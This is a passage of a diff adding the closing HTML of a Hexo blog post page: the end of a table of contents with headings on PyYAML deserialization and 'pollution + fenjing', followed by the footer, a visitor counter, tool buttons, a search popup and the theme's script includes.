class="nav-item nav-level-1"><a class="nav-link" href="#PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">PyYaml反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B1%A1%E6%9F%93-fenjing"><span class="nav-text">污染+fenjing</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">p0l1st</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        7 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
